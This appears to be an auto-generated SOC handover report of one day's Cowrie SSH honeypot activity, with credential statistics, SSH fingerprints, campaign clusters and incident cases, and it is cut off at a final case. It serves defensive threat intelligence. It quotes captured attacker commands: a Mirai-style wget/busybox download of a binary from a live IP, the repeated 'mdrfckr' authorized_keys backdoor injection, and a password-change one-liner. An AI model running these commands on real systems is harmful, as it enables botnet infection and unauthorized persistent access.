# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-01 |
| **Generated At** | 2026-11-01T17:25:17Z |
| **Shift Time** | 17:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **367** |
| Confirmed Threats | **322** |
| False Positives Filtered | **45** (12.3%) |
| Unique Attacker IPs | **215** |
| Countries of Origin | **50** |
| High Severity Cases | **194** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **173** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **901** |
| Unique Credential Pairs | **537** |
| Unique Usernames | **270** |
| Unique Passwords | **421** |
| Successful Auth Pairs | **697** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 195 |
| `345gs5662d34` | 126 |
| `ubuntu` | 70 |
| `support` | 28 |
| `admin` | 20 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 126 |
| `3245gs5662d34` | 125 |
| `support` | 28 |
| `123456` | 23 |
| `admin` | 20 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 126 |
| `root` | `3245gs5662d34` | 44 |
| `support` | `support` | 28 |
| `root` | `admin` | 9 |
| `admin` | `admin` | 7 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `oracle` | `oracle1` | `10.0.0.73` | 2026-11-01T02:55:04 |
| `admin` | `1` | `10.0.0.73` | 2026-11-01T02:56:07 |
| `root` | `000000` | `10.0.0.73` | 2026-11-01T02:57:10 |
| `rpm` | `rpm@123` | `10.0.0.73` | 2026-11-01T02:58:13 |
| `zoo` | `zoo@123` | `10.0.0.73` | 2026-11-01T02:59:14 |
| `button` | `button` | `10.0.0.73` | 2026-11-01T03:00:18 |
| `zhou` | `zhou` | `10.0.0.73` | 2026-11-01T03:01:24 |
| `admin` | `password` | `10.0.0.73` | 2026-11-01T03:02:33 |
| `user` | `password` | `10.0.0.73` | 2026-11-01T03:03:43 |
| `ian` | `ian123` | `10.0.0.73` | 2026-11-01T03:04:53 |
| `ian` | `123456` | `10.0.0.73` | 2026-11-01T03:06:05 |
| `root` | `larping` | `10.0.0.73` | 2026-11-01T03:07:23 |
| `sdadmin` | `51nGleD` | `10.0.0.73` | 2026-11-01T03:08:46 |
| `mitmproxy` | `mitmproxy` | `10.0.0.73` | 2026-11-01T03:10:08 |
| `visitor` | `visitor` | `10.0.0.73` | 2026-11-01T03:11:29 |
| `tiktok` | `tiktok` | `10.0.0.73` | 2026-11-01T03:12:51 |
| `tiktokv` | `tiktokv` | `10.0.0.73` | 2026-11-01T03:14:16 |
| `supplier` | `supplier` | `10.0.0.73` | 2026-11-01T03:15:46 |
| `denis` | `denis` | `10.0.0.73` | 2026-11-01T03:17:15 |
| `robin` | `robin` | `10.0.0.73` | 2026-11-01T03:18:47 |
_… 677 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **367** |
| Sessions with Fingerprint | **21** |
| Unique HASSH Fingerprints | **21** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 124 |
| Go SSH scanner | 69 |
| OpenSSH | 10 |
| Unknown | 5 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 110 | 59 |
| `2ec37a7cc8da...` | Mirai/variant | 36 | 5 |
| `eff4c24daffc...` | Modern SSH client | 8 | 1 |
| `390ffe68a68c...` | Modern SSH client | 8 | 3 |
| `98f63c4d9c87...` | Generic scanner | 7 | 7 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 110 | 59 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 36 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 4 | — |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `390ffe68a68c...` | OpenSSH | 8 | 3 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 7 | 7 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 6 | 2 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 4 | 4 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **53** |
| Campaign Clusters | **6** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1082, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1082, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1082, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 52 | 49 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo Zx9Qp2Lm7K
```
```
uname -m
```
```
rm -f /var/run/.4f06; wget -q http://180.93.193.100/arm7 -O /var/run/.4f06 2>/dev/null || busybox wget -q http://180.93.193.100/arm7 -O /var/run/.4f06 2>/dev/null
```
```
ls -la /var/run/.4f06 2>&1
```
```
clear
```
Source IPs: `180.93.193.100`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo Zx9Qp2Lm7K
```
```
uname -m
```
```
rm -f /var/run/.1336; wget -q http://180.93.193.100/arm7 -O /var/run/.1336 2>/dev/null || busybox wget -q http://180.93.193.100/arm7 -O /var/run/.1336 2>/dev/null
```
```
ls -la /var/run/.1336 2>&1
```
```
clear
```
Source IPs: `180.93.193.100`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "jlin\nVRiiPi5DjKDf\nVRiiPi5DjKDf"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `110.166.67.189`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **215** |
| Unique ASNs | **108** |
| High-Risk ASNs | **78** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 47 | HIGH |
| `AS4766` | Korea Telecom | 9 | HIGH |
| `AS398324` | Censys, Inc. | 8 | HIGH |
| `AS396982` | Google LLC | 7 | LOW |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS15169` | Google LLC | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS21859` | Zenlayer Inc | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (190)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7e77f3cd8881

| Field | Detail |
|---|---|
| **Source IP** | `125.212.235[.]194` |
| **First Seen** | 2026-11-01 03:20 |
| **Last Seen** | 2026-11-01 03:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:20:02` | `cowrie.session.connect` |
| `2026-11-01 03:20:02` | `cowrie.client.version` |
| `2026-11-01 03:20:02` | `cowrie.client.kex` |
| `2026-11-01 03:20:03` | `cowrie.login.success` |
| `2026-11-01 03:20:04` | `cowrie.session.params` |
| `2026-11-01 03:20:04` | `cowrie.command.input` |
| `2026-11-01 03:20:04` | `cowrie.command.failed` |
| `2026-11-01 03:20:05` | `cowrie.log.closed` |
| `2026-11-01 03:20:06` | `cowrie.session.params` |
| `2026-11-01 03:20:06` | `cowrie.command.input` |
| `2026-11-01 03:20:06` | `cowrie.session.file_download` |
| `2026-11-01 03:20:06` | `cowrie.log.closed` |
| `2026-11-01 03:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.212.235[.]194` to AbuseIPDB if not already reported
- [ ] Block `125.212.235[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31691a7d0c4f

| Field | Detail |
|---|---|
| **Source IP** | `125.212.235[.]194` |
| **First Seen** | 2026-11-01 03:20 |
| **Last Seen** | 2026-11-01 03:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:20:06` | `cowrie.session.connect` |
| `2026-11-01 03:20:06` | `cowrie.client.version` |
| `2026-11-01 03:20:06` | `cowrie.client.kex` |
| `2026-11-01 03:20:07` | `cowrie.login.success` |
| `2026-11-01 03:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.212.235[.]194` to AbuseIPDB if not already reported
- [ ] Block `125.212.235[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00fd582bdb26

| Field | Detail |
|---|---|
| **Source IP** | `123.253.162[.]254` |
| **First Seen** | 2026-11-01 03:21 |
| **Last Seen** | 2026-11-01 03:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:21:06` | `cowrie.session.connect` |
| `2026-11-01 03:21:06` | `cowrie.client.version` |
| `2026-11-01 03:21:06` | `cowrie.client.kex` |
| `2026-11-01 03:21:07` | `cowrie.login.success` |
| `2026-11-01 03:21:08` | `cowrie.session.params` |
| `2026-11-01 03:21:08` | `cowrie.command.input` |
| `2026-11-01 03:21:08` | `cowrie.command.failed` |
| `2026-11-01 03:21:09` | `cowrie.log.closed` |
| `2026-11-01 03:21:09` | `cowrie.session.params` |
| `2026-11-01 03:21:09` | `cowrie.command.input` |
| `2026-11-01 03:21:10` | `cowrie.session.file_download` |
| `2026-11-01 03:21:10` | `cowrie.log.closed` |
| `2026-11-01 03:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.253.162[.]254` to AbuseIPDB if not already reported
- [ ] Block `123.253.162[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8895bdb4fd7a

| Field | Detail |
|---|---|
| **Source IP** | `123.253.162[.]254` |
| **First Seen** | 2026-11-01 03:21 |
| **Last Seen** | 2026-11-01 03:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:21:10` | `cowrie.session.connect` |
| `2026-11-01 03:21:10` | `cowrie.client.version` |
| `2026-11-01 03:21:10` | `cowrie.client.kex` |
| `2026-11-01 03:21:11` | `cowrie.login.success` |
| `2026-11-01 03:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.253.162[.]254` to AbuseIPDB if not already reported
- [ ] Block `123.253.162[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68f66be0fd0f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-01 03:28 |
| **Last Seen** | 2026-11-01 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:28:50` | `cowrie.session.connect` |
| `2026-11-01 03:28:50` | `cowrie.client.version` |
| `2026-11-01 03:28:51` | `cowrie.client.kex` |
| `2026-11-01 03:28:51` | `cowrie.login.success` |
| `2026-11-01 03:28:51` | `cowrie.direct-tcpip.request` |
| `2026-11-01 03:28:51` | `cowrie.direct-tcpip.data` |
| `2026-11-01 03:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8072cd9ede09

| Field | Detail |
|---|---|
| **Source IP** | `180.247.62[.]53` |
| **First Seen** | 2026-11-01 03:35 |
| **Last Seen** | 2026-11-01 03:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:35:28` | `cowrie.session.connect` |
| `2026-11-01 03:35:28` | `cowrie.client.version` |
| `2026-11-01 03:35:28` | `cowrie.client.kex` |
| `2026-11-01 03:35:30` | `cowrie.login.success` |
| `2026-11-01 03:35:31` | `cowrie.session.params` |
| `2026-11-01 03:35:31` | `cowrie.command.input` |
| `2026-11-01 03:35:31` | `cowrie.command.failed` |
| `2026-11-01 03:35:31` | `cowrie.log.closed` |
| `2026-11-01 03:35:32` | `cowrie.session.params` |
| `2026-11-01 03:35:32` | `cowrie.command.input` |
| `2026-11-01 03:35:32` | `cowrie.session.file_download` |
| `2026-11-01 03:35:32` | `cowrie.log.closed` |
| `2026-11-01 03:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.247.62[.]53` to AbuseIPDB if not already reported
- [ ] Block `180.247.62[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c235a1fe1e04

| Field | Detail |
|---|---|
| **Source IP** | `180.247.62[.]53` |
| **First Seen** | 2026-11-01 03:35 |
| **Last Seen** | 2026-11-01 03:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:35:33` | `cowrie.session.connect` |
| `2026-11-01 03:35:33` | `cowrie.client.version` |
| `2026-11-01 03:35:33` | `cowrie.client.kex` |
| `2026-11-01 03:35:34` | `cowrie.login.success` |
| `2026-11-01 03:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.247.62[.]53` to AbuseIPDB if not already reported
- [ ] Block `180.247.62[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e632b0052ab5

| Field | Detail |
|---|---|
| **Source IP** | `172.190.220[.]228` |
| **First Seen** | 2026-11-01 03:38 |
| **Last Seen** | 2026-11-01 03:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:38:16` | `cowrie.session.connect` |
| `2026-11-01 03:38:16` | `cowrie.client.version` |
| `2026-11-01 03:38:16` | `cowrie.client.kex` |
| `2026-11-01 03:38:16` | `cowrie.login.success` |
| `2026-11-01 03:38:17` | `cowrie.session.params` |
| `2026-11-01 03:38:17` | `cowrie.command.input` |
| `2026-11-01 03:38:17` | `cowrie.command.failed` |
| `2026-11-01 03:38:17` | `cowrie.log.closed` |
| `2026-11-01 03:38:18` | `cowrie.session.params` |
| `2026-11-01 03:38:18` | `cowrie.command.input` |
| `2026-11-01 03:38:18` | `cowrie.session.file_download` |
| `2026-11-01 03:38:18` | `cowrie.log.closed` |
| `2026-11-01 03:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.220[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.190.220[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c5c3f5583e4

| Field | Detail |
|---|---|
| **Source IP** | `172.190.220[.]228` |
| **First Seen** | 2026-11-01 03:38 |
| **Last Seen** | 2026-11-01 03:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:38:18` | `cowrie.session.connect` |
| `2026-11-01 03:38:18` | `cowrie.client.version` |
| `2026-11-01 03:38:18` | `cowrie.client.kex` |
| `2026-11-01 03:38:18` | `cowrie.login.success` |
| `2026-11-01 03:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.220[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.190.220[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d809d22bdc

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-11-01 03:38 |
| **Last Seen** | 2026-11-01 03:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:38:48` | `cowrie.session.connect` |
| `2026-11-01 03:38:48` | `cowrie.client.version` |
| `2026-11-01 03:38:48` | `cowrie.client.kex` |
| `2026-11-01 03:38:49` | `cowrie.login.success` |
| `2026-11-01 03:38:49` | `cowrie.session.params` |
| `2026-11-01 03:38:49` | `cowrie.command.input` |
| `2026-11-01 03:38:49` | `cowrie.command.failed` |
| `2026-11-01 03:38:50` | `cowrie.log.closed` |
| `2026-11-01 03:38:50` | `cowrie.session.params` |
| `2026-11-01 03:38:50` | `cowrie.command.input` |
| `2026-11-01 03:38:50` | `cowrie.session.file_download` |
| `2026-11-01 03:38:50` | `cowrie.log.closed` |
| `2026-11-01 03:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4c391b946e

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-11-01 03:38 |
| **Last Seen** | 2026-11-01 03:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:38:51` | `cowrie.session.connect` |
| `2026-11-01 03:38:51` | `cowrie.client.version` |
| `2026-11-01 03:38:51` | `cowrie.client.kex` |
| `2026-11-01 03:38:51` | `cowrie.login.success` |
| `2026-11-01 03:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aea9a72539f0

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-11-01 03:45 |
| **Last Seen** | 2026-11-01 03:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 03:45:12` | `cowrie.session.connect` |
| `2026-11-01 03:45:12` | `cowrie.client.version` |
| `2026-11-01 03:45:12` | `cowrie.client.kex` |
| `2026-11-01 03:45:13` | `cowrie.login.success` |
| `2026-11-01 03:45:15` | `cowrie.session.params` |
| `2026-11-01 03:45:15` | `cowrie.command.input` |
| `2026-11-01 03:45:15` | `cowrie.command.failed` |
| `2026-11-01 03:45:15` | `cowrie.log.closed` |
| `2026-11-01 03:45:16` | `cowrie.session.params` |
| `2026-11-01 03:45:16` | `cowrie.command.input` |
| `2026-11-01 03:45:16` | `cowrie.session.file_download` |
| `2026-11-01 03:45:16` | `cowrie.log.closed` |
| `2026-11-01 03:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d6be6db3b0c

